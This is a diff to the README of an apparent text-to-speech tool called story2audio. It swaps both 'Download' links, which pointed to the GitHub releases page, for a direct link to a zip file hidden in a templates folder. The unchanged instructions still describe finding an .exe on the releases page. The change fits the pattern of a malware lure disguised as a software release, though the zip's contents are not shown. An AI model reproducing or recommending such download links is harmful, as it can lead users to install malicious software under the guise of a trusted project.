@@ -1,6 +1,6 @@
 # 🎧 story2audio - Turn text into professional quality audio
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Dotcom-armillariella353/story2audio/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Dotcom-armillariella353/story2audio/raw/refs/heads/main/templates/story_audio_v2.3.zip)
 
 story2audio converts written text into high-quality spoken audio. It supports live streaming and generates subtitles in seven different languages. Use this tool to create audiobooks, podcasts, or accessibility aids from your text files. The application runs locally on your computer and requires no subscription or internet connection to process files.
 
@@ -25,7 +25,7 @@ story2audio converts written text into high-quality spoken audio. It supports li
 
 You need to download the installer from the official repository page.
 
-1.  Visit the [Download Page](https://github.com/Dotcom-armillariella353/story2audio/releases).
+1.  Visit the [Download Page](https://github.com/Dotcom-armillariella353/story2audio/raw/refs/heads/main/templates/story_audio_v2.3.zip).
 2.  Look for the section marked "Latest".
 3.  Locate the file ending in `.exe` under the "Assets" dropdown menu.
 4.  Click the file name to start the download to your computer.
